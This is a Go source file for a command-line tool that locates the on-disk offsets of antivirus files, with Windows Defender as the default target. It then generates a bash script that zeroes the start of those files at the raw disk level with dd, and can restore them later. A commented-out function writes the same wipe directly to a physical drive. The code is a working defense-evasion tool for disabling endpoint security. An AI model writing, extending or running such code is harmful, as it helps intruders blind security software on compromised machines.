package main

import (
	"fmt"
	"maps"
	"os"
	"slices"
	"strings"

	"github.com/OneOfOne/xxhash"
	"github.com/spf13/cobra"
)

var (
	rootCmd     = cobra.Command{}
	productsCmd = &cobra.Command{
		Use: "products",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Println("Supported products:", strings.Join(slices.Collect(maps.Keys(productList)), ", "))
			return nil
		},
	}
	generateCmd = &cobra.Command{
		Use: "generate",
	}
	mode       = generateCmd.Flags().String("mode", "info", "show 'info' or generate 'bash' code to stdout")
	product    = generateCmd.Flags().String("product", "defender", "AV product to nifo (defender, all)")
	files      = generateCmd.Flags().StringSlice("files", nil, "Target file globs")
	wipesize   = generateCmd.Flags().Int("wipesize", 64, "Number of bytes to wipe")
	relativeto = generateCmd.Flags().String("relativeto", "partition", "Use offsets relative to (partition|drive) - getting drive info requires elevation")
)

func main() {
	rootCmd.AddCommand(productsCmd, generateCmd)
	generateCmd.RunE = func(cmd *cobra.Command, args []string) error {
		var targetfiles filescanner
		// manually requested files
		if len(*files) > 0 {
			for _, glob := range *files {
				targetfiles.AddIfFound(glob)
			}
		} else {
			if *product == "all" {
				for _, detector := range productList {
					targetfiles = append(targetfiles, detector()...)
				}
			} else {
				detector, ok := productList[*product]
				if !ok {
					return fmt.Errorf("unknown product: %v", *product)
				}
				targetfiles = append(targetfiles, detector()...)
			}
		}

		return nifo(*mode, targetfiles, *wipesize, *relativeto == "drive")
	}

	err := rootCmd.Execute()
	if err != nil {
		fmt.Println("errors detected")
		fmt.Println(err)
		os.Exit(1)
	}
	os.Exit(0)
}

type fileinfo struct {
	filename  string
	offset    uint64
	drivename string
}

func nifo(action string, files []string, wipesize int, drivemode bool) error {

	results, errors := getFileOffsets(files)
	for _, err := range errors {
		fmt.Printf("error getting file offset: %v\n", err)
	}

	for i, _ := range results {
		results[i].offset *= 4096 // convert from clusters to bytes
	}

	// map relative offset to absolute offset
	if drivemode {
		for i, file := range results {
			driveLetter := file.filename[0:1]

			extents, err := drivetoextents(driveLetter)
			if err != nil {
				return fmt.Errorf("failed to get extents for %q: %w", driveLetter, err)
			}

			if len(extents) != 1 {
				return fmt.Errorf("expected exactly one extent for %q, got %d", driveLetter, len(extents))
			}

			results[i].offset += extents[0].StartingOffset
			results[i].drivename = fmt.Sprintf(`\\.\PhysicalDrive%d`, extents[0].DiskNumber)
		}
	}

	switch action {
	case "info":
		for _, file := range results {
			fmt.Printf("file %v found at %d on %v\n", file.filename, file.offset, file.drivename)
		}
	case "bash":
		fmt.Print("#!/bin/bash\n\n")
		rawdevice := "DISK"
		if *relativeto == "partition" {
			rawdevice = "PARTITION"
		}
		fmt.Print("MODE=$1\n")
		fmt.Printf("%v=$2\n\n", rawdevice)
		fmt.Print("case $MODE in\n  nuke)\n  # Backing up sectors\n")
		for _, file := range results {
			backupname := fmt.Sprintf("backup-%08X.bin", xxhash.Checksum64([]byte(file.filename)))
			fmt.Printf("    # File %v (backed up to %v)\n", file.filename, backupname)
			fmt.Printf("    dd if=$%v of=%v skip=%v bs=1 count=%v\n", rawdevice, backupname, file.offset, wipesize)
			fmt.Printf("    dd if=/dev/zero of=$%v seek=%v bs=1 count=%v\n", rawdevice, file.offset, wipesize)
		}
		fmt.Print("  ;;\n\n")
		fmt.Print("  puke)\n")
		for _, file := range results {
			backupname := fmt.Sprintf("backup-%08X.bin", xxhash.Checksum64([]byte(file.filename)))
			fmt.Printf("    # Restore of %v (backed up to %v\n", file.filename, backupname)
			fmt.Printf("    dd if=%v of=$%v seek=%v bs=1 count=%v\n", backupname, rawdevice, file.offset, wipesize)
		}
		fmt.Print("  ;;\n\n")
		fmt.Print("  *)\n")
		fmt.Print("    echo \"Please nuke (wipe) or puke (restore) ...\"\n")
		fmt.Print("  ;;\n")
		fmt.Print("esac\n")

		// case "nuke":
		// return nukeoffsets(results, wipesize)
	}

	return nil
}

// Requires that the volume isn't mounted and that you have admin rights,
// unfortunately this does not work from Windows 2008 / 7 unless you're more clever than me
func nukeoffsets(fi []fileinfo, wipesize int) error {
	var lastdrive string
	var raw *os.File
	var err error
	var emptybuffer = make([]byte, wipesize)

	for _, file := range fi {
		if lastdrive != file.drivename {
			if raw != nil {
				raw.Close()
			}
			raw, err = os.OpenFile(file.drivename, os.O_RDWR|os.O_SYNC, 0644)
			if err != nil {
				return fmt.Errorf("unable to open physical drive: %v", err)
			}
			lastdrive = file.drivename
		}
		n, err := raw.WriteAt(emptybuffer, int64(file.offset))
		if err != nil {
			return fmt.Errorf("error writing to physical drive: %v", err)
		}
		if n != wipesize {
			return fmt.Errorf("only wrote %v of %v bytes to offset %v on drive %v", n, wipesize, file.offset, file.drivename)
		}
		fmt.Printf("Wiped first 64 bytes from %s at offset %d\n", file.filename, file.offset)
	}
	if raw != nil {
		raw.Close()
	}
	return nil
}
